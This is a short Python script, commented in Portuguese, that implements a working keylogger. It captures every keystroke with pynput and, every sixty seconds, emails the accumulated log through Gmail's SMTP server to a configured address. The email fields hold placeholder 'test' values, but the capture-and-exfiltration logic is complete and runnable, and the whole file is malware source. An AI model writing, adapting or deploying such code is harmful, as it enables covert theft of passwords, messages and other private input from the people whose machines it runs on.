from pynput import keyboard
import smtplib
from email.mime.text import MIMEText
from threading import Timer

log = ""

#Configurações de email

EMAIL_ORIGEM = "Seu email de teste"
EMAIL_DESTINO = "seu email de teste"
SENHA_EMAIL = "Sua senha do app Python"

def enviar_email():
    global log
    if log:
        msg = MIMEText(log)
        msg['SUBJECT'] = "Dados capturados pelo keylogger"
        msg['From'] = EMAIL_ORIGEM
        msg['To'] = EMAIL_DESTINO

        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(EMAIL_ORIGEM, SENHA_EMAIL)
            server.send_message(msg)
            server.quit()
        except Exception as e:
            print("Erro ao enviar", e)
        
        log = ""


    #Agendar horário de envio
    Timer(60, enviar_email).start()

def on_press(key):
    global log
    try:
       log+= key.char
    except AttributeError:
            if key == keyboard.Key.space:
                log+= " "
            elif key == keyboard.Key.enter:
                log+= "\n"
            elif key == keyboard.Key.backspace:
                log+= "[<]"
            else:
                pass


#inicia o keylogger e o envio automatico
with keyboard.Listener(on_press=on_press) as listener:
    enviar_email()
    listener.join()



